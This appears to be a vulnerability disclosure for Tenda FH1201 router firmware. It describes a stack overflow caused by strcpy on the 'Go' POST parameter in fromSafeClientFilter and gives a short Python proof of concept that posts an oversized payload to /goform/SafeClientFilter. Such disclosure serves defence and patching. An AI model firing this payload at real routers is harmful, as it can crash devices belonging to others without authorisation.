## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3322.html

## Affected version

FH1201 Firmware  V1.2.0.14(408)

## Vulnerability details

The Tenda FH1201 Firmware  V1.2.0.14(408) has a stack overflow vulnerability located in the `fromSafeClientFilter` function. This function accepts the `Go` parameter from a POST request. The statement `strcpy(v15, v1);` leads to a buffer overflow. The user-supplied `Go` can exceed the capacity of the `v15` array, thus triggering this security vulnerability.

![image-20240731134818205](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240731134818205.png)

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SafeClientFilter"
payload = b"a"*1000

data = {"Go": payload, "menufacturer": "tenda"}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240731134920382](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240731134920382.png)